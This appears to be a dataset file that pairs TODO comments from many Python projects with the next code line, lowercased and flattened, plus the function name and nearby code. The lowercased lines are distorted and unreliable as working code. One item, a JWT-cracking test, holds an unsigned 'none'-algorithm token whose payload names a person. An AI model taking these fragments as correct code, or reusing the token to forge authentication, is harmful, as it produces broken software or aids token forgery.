# todo: add mode, state </s> self._strokepaths.append((path, color, width, antialiasing))	PathIconEngine def addStrokePath(self, path, color=Qt.black, width=.9, antialiasing=False): def size(self): return self._size
# todo: content-type is hard-coded but ideally should be retrieved; </s> route_doc = """	_get_route_doc def _get_route_doc(url, rh): Content-Type: application/json {1}
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	init_host def init_host(self, host):
# todo create correct test data </s> channel.unlock(lock4, locksroot4, 'y' * 32, sender=tester.k1)	test_settle ]) lock4 = str(LOCK4.as_bytes) channel.settle() assert token.balanceOf(tester.a0) == half_amount + 2 + LOCK_AMOUNT - LOCK_AMOUNT4
# todo(stevemar): assert returned fields </s> self.openstack('container show ' + self.container_name)	test_container_show def test_container_show(self):
# todo(yuriyz): change to 404 (bug 1200517) </s> self.assertequal(response.status_int, 500)	test_update_not_found response = self.patch_json('/ports/%s' % uuid, {'extra': {'a': 'b'}}, expect_errors=True) self.assertEqual(response.content_type, 'application/json') self.assertTrue(response.json['error_message'])
# todo: remove this - cura-4482 </s> extruder_stacks.append(self._global_container_stack)	copyValueToExtruders new_value = self._active_container_stack.getProperty(key, "value") extruder_stacks = [stack for stack in ExtruderManager.getInstance().getMachineExtruders(self._global_container_stack.getId())] for extruder_stack in extruder_stacks: if extruder_stack != self._active_container_stack and extruder_stack.getProperty(key, "value") != new_value:
# todo: update once calculation_magic is implemented </s> assert store.get_lpq_projects() == set()	test_not_eligible_in_lpq _update_lpq_eligibility(project_id=17, cutoff=10)
# rbarlow_todo: convert this callrequest into a celery task call </s> agent_request = callrequest(	unbind_itinerary ] agent_manager = managers.consumer_agent_manager() agent_manager.unbind, args,
# todo: assume the fixup size is four bytes, probably bad. </s> fixupva += 4	get_basic_block_rule fixupva = idaapi.get_next_fixup_ea(fixupva) fixups.append(fixupva) fixup_byte_addrs = set([]) for fixup in fixups:
# todo: assert </s> assert 0	test_get_profile Test: get a profile object profile = self.remote.get_profile("testprofile0")
# todo: implement </s> def __validator(self):	__validator from flexget import validator return validator.factory('text')
# todo in python 2.7 and later, this should be </s> attributes = dict((column, getattr(instance, column))	DefaultSerializer foreign_key_columns = foreign_keys(model) columns = (c for c in columns if c not in foreign_key_columns) for column in columns)
kwargs['application'] = application.objects.get(client_id=credentials['client_id'])  # todo: this should be cached one day </s> kwargs.update(credentials)	dispatch kwargs['scopes'] = scopes kwargs['redirect_uri'] = redirect_uri return super(PreAuthorizationMixin, self).dispatch(request, *args, **kwargs) except errors.FatalClientError as e:
except httperror as e:  # @todo ask for server instead </s> print("invalid url provided")	findBestServers try: response = requests.get(url, headers=headers).json() for i in response: if i["exists"] is True:
# todo(dolph): can be uncommented pending bug 968519 </s> tenant)	test_create_null_tenant_name tenant['id'],
# todo: expect_match should work with emit() </s> m = state.expect_match(	scan_command_new state.expect('+') state.ignore() r'(?:f(?:ile)?f(?:ormat)?|(?:file)?enc(?:oding)?|(?:no)?bin(?:ary)?|bad|edit)(?=\s|$)', lambda: VimError(ERR_INVALID_ARGUMENT))
# todo should this be handled differently when there are multiple ratings? </s> p_movie = p_movies[0]	run_ratings if not p_movies: return True if t_movie and t_movie.rating_advanced == p_movie.user_rating: return True
# todo see if this can be better done in one query </s> return pagination(query.paginate(page, per_page), page, per_page, query.count())	relation_instances query = getattr(item, attribute) if page and per_page: return query
# todo: get rid of sleep hack!! </s> self.assertraises(scopenotfoundexception, self.cm.drop_collection, collectionspec('collectionname', 'scopename'))	testDropCollectionScopeNotFound def testDropCollectionScopeNotFound(self):
# todo stop guessing </s> remove_entire_file = (location.get('line') or location.get('column')) is none	_get_issues_from_location for location in locations: filepath = location.get('file') issue = issue_class(filepath, remove_entire_file) issue.add_element(message)
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise	UPnPComponent log.info("found upnp gateway: %s", self.upnp.gateway.manufacturer_string) except Exception as err: log.warning("upnp discovery failed: %s", err) self.upnp = None
''' todo: change conditional to return on non-http responses </s> to reduce branch depth'''	indexFileAt iter = TextRecordParser(**textRecordParserOptions) for entry in iter(warc): if entry.record.rec_type != 'response' or \ entry.get('mime') in ('text/dns', 'text/whois'):
# todo(pep612): fix for paramspectype </s> if isinstance(v, paramspectype):	freshen_function_type_vars tvmap: Dict[TypeVarId, Type] = {} for v in callee.variables: continue assert isinstance(v, TypeVarType)
# compare filesizes todo print analysis of this :) </s> cmd = "ls -l '%s.ttf'*" % filename	ttx_process cmd = "ttx -i '%s.ttx'" % filename run(cmd, cwd=_out, log=log) run(cmd, cwd=_out, log=log) cmd = "rm  '%s.ttf.orig'" % filename
#change status of todo </s> todo.status = 'closed'	test_change_property_value_after_alert todo.description = 'Test Property Change after Alert' todo.save() todo.save() email_queue = frappe.get_doc('Email Queue', {'reference_doctype': 'ToDo',
# todo: figure out way to paramaterize node['osd_ids'] for this test </s> for osd_id in node["osd_ids"]:	test_osd_services_are_enabled def test_osd_services_are_enabled(self, node, Service): assert Service("ceph-osd@%s" % osd_id).is_enabled
# todo: should we concatenate preprocessed_s and preprocessed_last_s_prime? </s> state_values_pi, logits_pi, _ = \	update_from_memory initial_internal_states = self.call(splitter.split, records) preprocessed_last_s_prime = self.call(preprocessor.preprocess, last_s_prime) self.call(policy.get_baseline_output, preprocessed_s, initial_internal_states) _, log_probabilities_pi = self.call(softmax.get_probabilities_and_log_probs, logits_pi)
# todo: implement </s> committed for any reason.	whenCommitted transaction has been committed, or fails if the transaction is not
1  # todo: fill in identifier </s> )	test_closewithouttransfer_badalice BA_Transfer0 = channelBA.create_directtransfer( transfer_amount, BA_Transfer0.sign(privatekeyB, addressB) channelAB.register_transfer(BA_Transfer0)
# todo: this should be configurable. some people may want such </s> if logger.isenabledfor(logging.debug):	RequestHandler status = INTERNAL_SERVER_ERROR reason = _reason_internal_server_error msg = 'Caught an exception, rid:[{0}], status:[{1}], reason:[{2}], _format_exc:[{3}]'.format( rid, status, reason, _format_exc)
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo: add for morph targets data. </s> min_index = min(indices)	extract_primitive_floor process_bone = False bone_max = bone_index max_index = max(indices) for old_index in indices:
# todo: remove when #980 has been merged </s> info.update(formats[-1])	_real_extract 'duration': int(attr['duration']), } return info
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_POST_InvalidData try: self.assertEqual(self.rnw.POST(url, data), 'json') self.assertEquals(e, TypeError)
# todo: remove this once there's proper support in upstream jinja </s> def jinja2_babel_extract(fileobj, keywords, comment_tags, options):	jinja2_babel_extract Hooks on to Jinja's babel_extract and handles whitespace within ``{% trans %}`` tags.
# todo: find another way ... </s> for side in ['left', 'top', 'right', 'bottom']:	split_inline_box inlinebox.border_right_width) except TypeError: inlinebox.reset_spacing(side) left_spacing = 0
# todo: use the solution we implement once #134 gets fixed </s> a = next(cursor)	testReal 'pymssqlRealTest', (0.5,)) assert abs(a[0] - 0.5) < 0.000001
# todo: rate limiting </s> p_ctx.active = true	handle_rpc p_ctx, others = contexts[0], contexts[1:] p_ctx.out_stream = request if p_ctx.in_error: return self.handle_rpc_error(p_ctx, others, p_ctx.in_error, request)
# todo complete this method </s> return none	get_matvec def get_matvec(self, kshift, imds=None, left=False, **kwargs):
# todo: avoid building interpolant every time? </s> interpolant_xyz = interp1d(reference_epochs.jd, coordinates.xyz.value, kind=kind)	_interpolate xyz_unit = coordinates.xyz.unit d_xyz_unit = coordinates.differentials["s"].d_xyz.unit interpolant_d_xyz = interp1d( reference_epochs.jd, coordinates.differentials["s"].d_xyz.value, kind=kind,
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> testdata = [	test_jwt_cracking def test_jwt_cracking(self): [ 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiJlOTU4YzA5YS1hYzM3LTQ5MDAtYjRkNy1mYjNlZWFmNzMzOGQiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9jY2ViYTE0Yy02YTAwLTQ5YWMtYjgwNi04NGRlNTJiZjFkNDIvIiwiaWF0IjoxMzkxNjQ1NDU4LCJuYmYiOjEzOTE2NDU0NTgsImV4cCI6MTM5MTY0OTM1OCwidmVyIjoiMS4wIiwidGlkIjoiY2NlYmExNGMtNmEwMC00OWFjLWI4MDYtODRkZTUyYmYxZDQyIiwib2lkIjoiYTQ0MzIwNGEtYWJjOS00Y2I4LWFkYzEtYzBkZmMxMjMwMGFhIiwidXBuIjoicnJhbmRhbGxAcnJhbmRhbGxhYWQxLm9ubWljcm9zb2Z0LmNvbSIsInVuaXF1ZV9uYW1lIjoicnJhbmRhbGxAcnJhbmRhbGxhYWQxLm9ubWljcm9zb2Z0LmNvbSIsInN1YiI6IjRnVHY0RXRvWVctRFRvdzBiRG5KZDFBQTRzZkNoQmJqZXJtcXQ2UV9aYTQiLCJmYW1pbHlfbmFtZSI6IlJhbmRhbGwiLCJnaXZlbl9uYW1lIjoiUmljaCJ9.',
# todo need copy? </s> x = mesh.node_coords.copy()	quasi_newton_uniform_blocks def quasi_newton_uniform_blocks(*args, **kwargs): def get_new_points(mesh): x += quasi_newton_update_diagonal_blocks(mesh) return x[mesh.is_interior_node]
# todo: signal to the user that they should reload their data! </s> if self._sequence_id is none:	listen while True: rc = self._mqtt.loop(timeout=1.0) self._sequence_id = fetch_sequence_id(self.session) self._messenger_queue_publish()
# todo: simulate short dataset with known properties and use it </s> events = find_events(targets=ds.sa.targets, chunks=ds.sa.chunks)	test_get_contrasts skip_if_no_external('nipy')  # ATM relies on NiPy's GLM implementation ds = load_example_fmri_dataset('25mm', literal=True)[{'chunks': [0, 1]}, :3] tr = ds.a.imghdr['pixdim'][4] for ev in events:
# todo(b/186451541): reduce the number of calls to model_fn. </s> self.assertequal(mock_model_fn.call_count, 4)	test_construction_calls_model_fn federated_averaging.build_federated_averaging_process( model_fn=mock_model_fn, client_optimizer_fn=tf.keras.optimizers.SGD)
# todo: this crashes if a feature is already named 'index'. </s> index_name = 'index'	predict index_name = data.index.name if index_name is None: y_pred = proba.loc[proba.groupby(["image"])["score"].idxmax()].reset_index(drop=True) idx_to_image_map = data[['image']]
# todo: convert into a proper api to detect read-only layouts </s> self._focus += 1	Frame break except IndexError: if self._on_load is not None: self._on_load()
# todo: location </s> id = media.id	media_to_object Returns: an ActivityStreams object dict, ready to be JSON-encoded object = { 'id': self.tag_uri(id),
# todo: make this configurable </s> for aggregate in aggregates:	create_cube aggregates.append(aggregate) aggregate_dict[aggregate.name] = aggregate function = aggregate.function template = IMPLICIT_AGGREGATE_LABELS.get(function)
# todo: the stuff </s> log.debug('flushing simple persistence updates to db.')	flush def flush(self):
# todo: docs and comments </s> torch.save(labels, "/private/home/bkorbar/torch_projects/vmz/pt/labels.pth")	aggredate_video_accuracy def aggredate_video_accuracy(softmaxes, labels, topk=(1,), aggregate="mean"): torch.save(softmaxes, "/private/home/bkorbar/torch_projects/VMZ/pt/SM.pth") maxk = max(topk)
# todo (t65593688): this should be removed after </s> with torch.no_grad():	test_tokens_dictfeat def test_tokens_dictfeat(self): model = Seq2SeqModel.from_config( Seq2SeqModel.Config(
# reasons why we said no. todo: allow configurable error messages </s> raise synapseerror(	create_association ) if not self.config.is_alias_creation_allowed(user_id, room_alias.to_string()): 403, "Not allowed to create alias", )
self.button_align_test = wx.button(self, label="align test")    # todo maybe align left? </s> self.button_help = wx.button(self, label="help")                # todo maybe align left?	__init__ self.sizer_setting_hotkey = wx.StaticBoxSizer(wx.VERTICAL, self, "Hotkey") self.button_apply = wx.Button(self, label="Apply") self.button_close = wx.Button(self, label="Close")
# todo: requires special treatment? </s> current_unit = line.variants[0].line[0]	production_queue_ability :rtype: ...dataformat.expected_pointer.ExpectedPointer if isinstance(line, GenieVillagerGroup): else: current_unit = line.line[0]
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> sampleparameters = {	test_acquire_token_with_user_pass def test_acquire_token_with_user_pass(self): "tenant" : "common", "authorityHostUrl" : "https://login.windows.net",
# todo(berrange): why do we bother converting the </s> return jsonutils.dumps(cpu_info)	get_cpu_info guest_arches.append(g.arch) cpu_info['permitted_instance_types'] = guest_arches
# todo: just a quick hack (screen is erased before scrolling begins). </s> string = " " + string + " " # just to avoid artifacts on full width characters	Launchpad time.wait(waitms) elif direction == self.SCROLL_RIGHT: for n in range( (len(string) + 1) * 8 - 7, 0, -1 ): if n <= len(string)*8:
accept_federated_only=self.federated_only)  # todo: 466 </s> self.remember_node(seed_node)	__attempt_bootnode_learning known_certs_dir=self.known_certificates_dir, timeout=timeout, except RuntimeError: if current_attempt == retry_attempts:
# todo: rate limiting </s> p_ctx.active = true	ZeroMQServer contexts = self.generate_contexts(initial_ctx) p_ctx, others = contexts[0], contexts[1:] if p_ctx.in_error: p_ctx.out_object = p_ctx.in_error
).consume()  # todo see issue 170 </s> for instance in reservation["instances"]:	load_ec2_instances Region=region, aws_update_tag=aws_update_tag, instanceid = instance["InstanceId"] monitoring_state = instance.get("Monitoring", {}).get("State", "")
# todo debug </s> print "rule can not trigger at the moment"	run + "'%d' rules can not trigger at the moment." % alertLevel.level) sensorAlertsToHandleWithRules.remove( sensorAlertToHandle)
# todo: attachments. </s> sql_form.auth_context = couch_form.auth_context	_migrate_form_and_attachments assert isinstance(sql_form, XFormInstanceSQL) sql_form.domain = domain sql_form.submit_ip = couch_form.submit_ip
if key.endswith('_state'): # todo: kludge </s> self._blockresources[key[:-len('_state')]] = none	callback def callback(key, persistent, ctor): if ctor is sdr.top.SpectrumTypeStub: self.putChild(key, SpectrumResource(block, key))
# todo(b/182621549): for sobol sequences, dimension should be known at graph </s> dim = _get_static_dim(mean)	_process_mean_scale else: batch_shape = tf.shape(mean) dtype = mean.dtype return mean, scale_matrix, batch_shape, dim, dtype
# todo(piyush): current api-site doesn't contain this api description. </s> uri = '/agents/%s/l3-routers' % agent_id	add_router_to_l3_agent def add_router_to_l3_agent(self, agent_id, **kwargs): return self.create_resource(uri, kwargs)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	suspend def suspend(self, instance, callback):
""" todo. """ </s> def __init__(self, name, url, auth=none):	KodiDevice class KodiDevice(MediaPlayerDevice): self._name = name self._url = url
# todo: consider implement it through calling self.collected </s> return collection(	all_first 'that is collected(lambda e: e.all(selector)).first ... o_O ', FutureWarning) by = to_by(css_or_xpath_or_by) Locator(f'{self}.all_first({by})', lambda: [webelement.find_element(*by) for webelement in self()]),
# todo: alot of stuff here </s> self.in_parsing = true	decode_in else:
# todo remove this method. should be handled in importtask creation. </s> items = []	read_items def read_items(paths): If an item could not be read it skips the item and logs an error. for path in paths: try:
# todo: figure out how to mock open </s> with patch(	test_get_config_tuple_from_egrc_all_none_when_not_present def test_get_config_tuple_from_egrc_all_none_when_not_present(): 'ConfigParser.RawConfigParser.readfp', return_value='read_file'
# todo: remove str() when dropping support for py37. </s> args = [self.executable_name,	runshell def runshell(self): str(self.connection.settings_dict['NAME'])] subprocess.run(args, check=True)
# todo fixme insert and replace instead </s> engine.execute(alala.table_hash.delete())	wrapper datas = wrapped(key) engine.execute(alala.table_data.insert().values(datas)) # TODO chunks?? engine.execute(alala.table_hash.insert().values([{'value': h}])) return datas
# todo: refactor. </s> if (yield version.at_least(self.cx, (2, 5, 4))):	test_copy_db_auth_concurrent yield self.check_copydb_results({'_id': 1}, test_db_names) finally: yield self.db.command({'dropAllUsersFromDatabase': 1}) else:
# todo: remove warning check once deprecated </s> hits = list(self.df.sindex.intersection((2.5, 2.5, 4, 4), objects=true))	test_sindex assert self.df.sindex.size == 5 with pytest.warns(FutureWarning, match="`objects` is deprecated"): assert len(hits) == 2 assert hits[0].object == 3
# todo: test this </s> for chan in self.channels.values():	_handle_chanupd_from_failed_htlc if r == UpdateStatus.GOOD: self.logger.info(f"applied channel update to {short_channel_id}") if chan.short_channel_id == short_channel_id: chan.set_remote_update(payload['raw'])
# todo: move to serializer </s> file = self.request.files.get('file', [])[0]	post def post(self): path = self.get_body_argument('path') filename = self.get_body_argument('filename', None)
# todo: ... </s> prediction: array-like	classify_output ---------- target: Array-like Returns -------
# todo: change the way we do it (csv dialect may change, encoding </s> file_header = open_compressed(filename).readline().strip().split(",")	import_data start_time = time.time() progress = ProgressBar(prefix="Importing data", unit="bytes") table_schema = self.table.schema schema = OrderedDict([(field_name, table_schema[field_name]) for field_name in file_header])
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	solve exception_on_failure=True, io_options=None): PersistentSolver if self.instance is None:
# todo counts as yes if vhnd was not available </s> return len([c for c in self.cases if c.preg_weighed])	preg_weighed @property def preg_weighed(self):
# todo this should depend on the error (even more granularity) </s> try:	Peer self.on_channel_update(payload) else: short_chan_id = route[sender_idx + 1].short_channel_id except IndexError:
# todo: this also needs to trigger filter_specs.updateui to switch to </s> logger.debug("_save_entries - coeffients / zpk updated:\n"	_save_entries self.load_entries() # only needed for stand-alone test self.sigFilterDesigned.emit() "b,a = %s\n\n" "zpk = %s\n"
# todo: i put dummy() to fix below, remove the comments after a while. </s> self.asserttrue(tsmain is not none) # fix: i see this fails sometimes	test_ctx_stats self.assertTrue(tst1 is not None) self.assertTrue(tst2 is not None) self.assertTrue(1.0 > tst2.ttot >= 0.5) self.assertTrue(1.0 > tst1.ttot >= 0.5)
# todo: optimizer state gets cast to fp16 and back to fp32 for </s> for group in self.param_groups:	load_state_dict def load_state_dict(self, state_dict: Dict[str, Any]) -> None: super().load_state_dict(state_dict) for p in group["params"]: self.state[p]["exp_avg"] = self.state[p]["exp_avg"].type(self.optim_type)
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: log errors to log file </s> pass	run_cli self.parse_kubeconfig() except: user_input = prompt('kube-shell> ', history=self.history,
# todo: use optparse command options instead. </s> project_dir = sys_argv[1]	main sys_argv.pop(1) try: sys_argv.pop(1) except IndexError:
# todo - fix this to be more efficient, so we don't parse the file twice </s> def get_xmlns(self, stream):	get_xmlns xml_string = get_xml_string(stream) try:
# todo: alltoall not yet implemented on xla:cpu </s> if jtu.device_under_test() == "cpu":	testPswapaxes def testPswapaxes(self): device_count = xla_bridge.device_count() device_count = 1 shape = (device_count, 3, device_count, 5)
self.progressbar.set_text("sorting ... ") # todo(jflesch): i18n/l10n </s> gtk_refresh()	_progress_callback self.progressBar.set_text("Reading '%s' ... " % (doc)) # TODO(Jflesch): i18n/l10n elif step == DocSearch.INDEX_STEP_SORTING:
# todo: support other output fields </s> return activations(lh, [], [], [], is_grad=self.is_grad)	get_slice def get_slice(self, x, y) -> "Activations": lh = self.lh[x, y]
# todo: deprecated - remove in version 0.10 </s> self.is_enabled = activate	toggle def toggle(self, activate):
raise exception  # todo </s> self.key = key	__init__ if isinstance(columns[0], basestring): if k not in columns: elif isinstance(columns[0], tuple): key_matched = False
pass #todo fix imports </s> def visit_importfrom(self, node):	visit_ImportFrom
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	list_instances_detail def list_instances_detail(self):
# todo: test coverage for this branch </s> logger.exception('error %s while submitting email to %s.',	subscribe_request instance.send_activation_email(action='subscribe') except Exception, e: e, instance.email) error = True
#todo kajak doesnt like my consumer-list -> research why? </s> message.append(sig)	exportKcd noderef = etree.Element('NodeRef', id=str(nodeList[reciever])) consumer.append(noderef) bus.append(message) root.append(bus)
#@todo: remove in 0.4.10 </s> def downloadlink(self, link):	downloadLink if link and isinstance(link, basestring): self.correctCaptcha()
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
pass     # todo: </s> def _uninstall(self, packages):	_uninstall
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
# todo: handle index/keyerror here when we overrun a segment </s> flags = self.getflags(ea)	ItemSize while not ida_bytes.isHead(flags): ea += 1 return oea - ea
# todo: confirm is uri </s> self_uri = self.resource.uri.string	relative_uri def relative_uri(uri): if uri.startswith(self_uri): return uri[len(self_uri):]
return response(status=400)  # todo </s> if not eth_utils.is_checksum_address(new_address):	register new_address = request.form['address'] except KeyError: return Response(status=400)  # TODO if new_address in self.reserved_addresses:
# # todo: # fixme: </s> nb_days_seen_in_pastes = 30	hash_graph_line_json nb_days_seen_in_pastes = 30 else: date_range_seen_in_pastes = get_date_range(nb_days_seen_in_pastes) if r_serv_metadata.hget('metadata_hash:'+hash, 'estimated_type') is not None:
# todo(sdake) the parameters to delete operations are highly suspect </s> rc=self.fake_rc)	test_rc_create version='1.0',
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = none	enrich_json_with_data j_dic['duration'] = len(ann_obj.failed_lines) * 3 else: j_dic['mtime'] = ann_obj.ann_mtime j_dic['ctime'] = ann_obj.ann_ctime
# todo: should be injected </s> self.facade = awsfacade()	__init__ def __init__(self): super(S3, self).__init__('s3', {})
# todo: try simply using all possible fields instead of extracting features manually. </s> title = issue["title"]	transform res = str(res) data[feature_extractor_name] = res body = issue["body"] for cleanup_function in self.cleanup_functions:
# todo: make truly async </s> self._resourcemanager_client = discovery.build('cloudresourcemanager', 'v1', cache_discovery=false, cache=memorycache())	__init__ def __init__(self):
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	agent_update def agent_update(self, instance, url, md5hash):
# todo: try reconnecting? </s> raise	_listen if exc.errno == errno.EBADF:  # socket closed return
#self.resetacount() #@todo implement </s> else:	prepare if self.api_data["size"] / 1024 > info["trafficleft"]: self.log.info(_("%s: Not enough traffic left" % self.__name__)) self.url = self.api_data["mirror"] return True
#todo: remove this transformation </s> personal_schemas = set([schema.qualified_name for schema in personal_schemas_raw])	add_schema_ownerships changed (to be the same as the schema owner). personal_schemas_raw = dbcontext.get_all_personal_schemas() schemas_and_owners = dbcontext.get_all_schemas_and_owners() for schema, owner in schemas_and_owners.items():
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
# todo: this method should not require the training data. </s> if  "train_features_file" in metadata:	_fn def _fn(): self._initialize(metadata) _ = self.features_inputter.make_dataset(metadata["train_features_file"]) return self.features_inputter.get_serving_input_receiver()
# todo: tab completion for the local system. </s> current_word = get_last_word(self.input_buffer) if self.input_buffer else ""	_state_ground os.write(context.active_session.master, ("ls -1A --color=never -w %d\r" % context.window_size[1]).encode("ascii")) ls = self.read_all_output().split("\r\n") complete(current_word, ls) elif c == 0x0B:
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'input': (DENSE, ), 'output': PREDICTIONS,
#todo - look at alphabet? </s> continue	test_the_reverse_complement mapping = maketrans("CGcg","GCgc") else : self.assertEqual(str1.translate(mapping)[::-1], str(comp)) self.assertEqual(comp.alphabet, example1.alphabet)
# todo: docstring </s> import ptvsd.wrapper	debug def debug(filename, port_num, debug_id, debug_options, run_as): import pydevd sys.argv[1:0] = [
# todo: reactivate after fixing alternative selection </s> self.assertequal(form.fields['serviceprovider'].label, 'serviceprovider')	test_system_importer_file_csv_form_based_serviceprovider_form_label form = SystemImporterFileCsvFormbasedForm()
# todo add brief documentation what that means </s> if self.residual_before_ln:	Adapter up = self.adapter_up(down) output = up output = output + residual_input if self.add_layer_norm_after:
# todo: else: req.warning('...') </s> req.redirect(req.href.admin(cat, page))	PermissionAdminPanel if (subject,group) not in all_permissions: perm.grant_permission(subject, group) elif req.args.get('remove') and req.args.get('sel'): req.perm.require('PERMISSION_REVOKE')
# todo :: move arbitray path construction to storagelayout object </s> url = '{0}/tar_partitions/part_{number}.tar.lzo'.format(	__call__ pipeline.finish() tf.flush() self.backup_prefix.rstrip('/'), number=tpart.name) logger.info(msg='begin uploading a base backup volume',
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: implement clock interrupt. </s> ql.os.set_cf()	__leaf_06_07_09 def __leaf_06_07_09(ql: Qiling):
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
#todo: algorithm is cryptfiltername, specified in the /cf dictionary </s> return (-1,'crypt not supported yet')	crypt return (0, stream) else:
# todo: remove in future release </s> if force_masquerade and not get_masquerade(zone):	add_port salt.utils.warn_until('Neon', 'add_port function will no longer force enable masquerading in future releases. Use add_masquerade to enable masquerading.') add_masquerade(zone) cmd = '--zone={0} --add-port={1}'.format(zone, port)
# todo: we want to create a state group for this set of events, to </s> prev_group = none	_make_state_cache_entry state_group=sg, ) delta_ids = None for old_group, old_state in iteritems(state_groups_ids):
# todo: remove this as soon it is fixed in plaidml. </s> if keras.backend.backend() == "plaidml.keras.backend":	compile_predictors def compile_predictors(self): logger.debug("Compiling Predictors") optimizer = Adam(lr=5e-5, beta_1=0.5, beta_2=0.999) else:
# todo: limit/check colorcode </s> if colorcode is none:	LaunchpadPro if number < 0 or number > 99: return colorcode = LaunchpadPro.COLORS['white'] self.midi.RawWriteSysEx( [ 0, 32, 41, 2, 16, 35, number, colorcode ] )
# todo: simplify this via aliasing methods in `frappe.qb` </s> if frappe.db.db_type == "mariadb":	update_password .insert(doctype, user, fieldname, hashPwd, 0) ) query = ( query.on_duplicate_key_update(Auth.password, hashPwd)
# self.skiptest("unfinished (bad functionality?)") # todo </s> testname = self.testname()	test_4036_notify_service_functions_with_reload if not os.path.exists("/usr/bin/socat"): self.skipTest("missing /usr/bin/socat") testdir = self.testdir() user = self.user()
# todo: change to us-east-1 </s> credentials = read_creds('default')	test_get_sns_region def test_get_sns_region(self): service_config = {'regions': {'us-east-1': {}}} get_sns_region(params = {'region': 'us-east-1', 'creds': credentials, 'sns_config': service_config})
# todo these args are locked and can not be changed </s> blur = cv2.gaussianblur(old, (5, 5), 0)	sharpen_frame :param old: :return: smooth = cv2.addWeighted(blur, 1.5, old, -0.5, 0) canny = cv2.Canny(smooth, 50, 150)
# todo: figure out, what's going on with v6 here! </s> import time	test_AnnexRepo_commit f.write("File to add to git") if ds.config.getint("annex", "version") == 6: time.sleep(1) ds.add(filename, git=True)
# todo: do not require xml directly here. </s> def __init__( self, elem, parse_param_elem ):	TestCollectionDef class TestCollectionDef( object ): self.elements = [] attrib = dict( elem.attrib )
# todo partially update stored playlists? </s> len(tracks), position, playlist.name())	tracks_added u'%d track(s) added to position %d in playlist "%s"',
# todo: the following skipped suite and fixtures should be enabled </s> return	test_Provider_when_calling_delete_record_by_identifier_should_remove_record def test_Provider_when_calling_delete_record_by_identifier_should_remove_record(self):
# todo: use spoolup options to fetch main value </s> volley, spooltime = stuff.getvolley(spooltype=spooltype.scale, spoolamount=1, ignorestate=true)	__getData tooltip = "tracking speed" info.append((text, tooltip)) if spoolTime: text = "{0}s".format(formatAmount(spoolTime, 3, 0, 3))
# todo - this is what i get back from kafka at the moment, clearly it's wrong </s> response = protocol.consumermetadataresponse(	test_offset_commit_response def test_offset_commit_response(self): buffer('\x00\x00\x00\x00') )
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, axis=none, skipna=none, level=none, ddof=1, numeric_only=none):	var_overload @overload_method(DataFrameType, 'var') def var_overload(df, axis=None, skipna=None, level=None, ddof=1, numeric_only=None): return hpat.hiframes.pd_dataframe_ext.var_dummy(df) return _impl
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo: need to end xa state here </s> self.do_commit(connection.connection)	do_commit_twophase if oci_prepared:
# todo: remove temporary workaround once https://github.com/python-babel/babel/issues/415 has been resolved. </s> babel_415_workaround = description['title']	load self.ui.update_level.clear() for level, description in PROGRAM_UPDATE_LEVELS.items(): self.ui.update_level.addItem(_(babel_415_workaround), level) self.ui.update_level.setCurrentIndex(self.ui.update_level.findData(config.setting["update_level"]))
# todo: some kind of value escape </s> return '"%s"' % (value)	_render_labelvalue def _render_labelvalue(self, value):
# todo: enable output dtype selection. </s> results = eval(cmd).astype(kwargs['dtype'])	calc parts.pop()) logger.debug("Translated cmd: %r", cmd) dst.write(results) else:
# todo: handle bidi </s> translate_x = box.left	relative_positioning resolve_one_percentage(box, 'bottom', containing_block.height) if box.left != 'auto' and box.right != 'auto': elif box.left != 'auto': translate_x = box.left
#todo - should the default be gapped(single_letter_alphabet) instead? </s> def __init__(self, handle, alphabet = single_letter_alphabet) :	StockholmIterator "OC" : "organism_classification", "LO" : "look"} handle - input file alphabet - optional alphabet
# todo(tr3buchet) - remove comment in multi-nic </s> for network in networks:	create_vifs networks = db.network_get_all_by_instance(admin_context, instance['id']) bridge = network['bridge'] network_ref = \
# todo: cartopy has had two formatters for a while but we use newer one </s> if labelpad is not none:	_CartopyAxes gl, which='major', longrid=longrid, latgrid=latgrid, nsteps=nsteps, ) gl.xpadding = gl.ypadding = labelpad if loninline is not None:
